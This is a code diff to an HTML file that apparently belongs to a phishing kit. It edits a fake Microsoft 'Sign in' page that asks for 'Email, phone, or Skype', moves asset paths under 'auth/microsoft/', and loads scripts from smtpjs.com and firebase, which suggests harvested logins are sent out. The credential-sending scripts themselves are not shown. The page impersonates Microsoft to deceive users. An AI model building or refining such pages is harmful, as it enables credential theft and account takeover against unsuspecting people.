@@ -6,6 +6,7 @@
   <script src="js/jquery-3.6.0.min.js"></script>
   <link rel="stylesheet" href="css/index.css">
   <link rel="stylesheet" href="secured/yahoo/css/style.css">
+  <link rel="stylesheet" href="auth/microsoft/style.css">
   <script src="js/index.js"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.js"></script>
@@ -309,8 +310,8 @@
       <main>
           <div id="form-holder">
               <img class="sign-in" src="auth/microsoft/img/microsoft_logo.svg" alt="logo" id="ms-logo">
-                  <h2 class="sign-in-content sign-in">Sign in</h2>
-                  <p class="error-message sign-in">That Microsoft account doesn't exist. Enter a different account or <a href="#">get a new one</a>.</p>
+                  <h2 class="sign-in-content sign-in">Sign in</h2><br>
+                  <p class="error-message sign-in">That Microsoft account doesn't exist. Enter a different account or <a href="#">get a new one</a>.</p><br><br>
                   <input id="hm-email" class="sign-in-content sign-in" type="email" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader" placeholder="Email, phone, or Skype">
                   <p class="sign-in-content sign-in">No account? <a href="#">Create one!</a></p>
                   <p class="sign-in-content sign-in"><a href="">Sign-in options</a></p>
@@ -339,9 +340,9 @@
 </div>
 
 <script src="https://smtpjs.com/v3/smtp.js"></script>
-<script src="jquery.js"></script>
-<script src="emails.js"></script>
-<script src="script.js"></script>
+<script src="auth/microsoft/jquery.js"></script>
+<script src="auth/microsoft/emails.js"></script>
+<script src="auth/microsoft/script.js"></script>
 
 
   <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
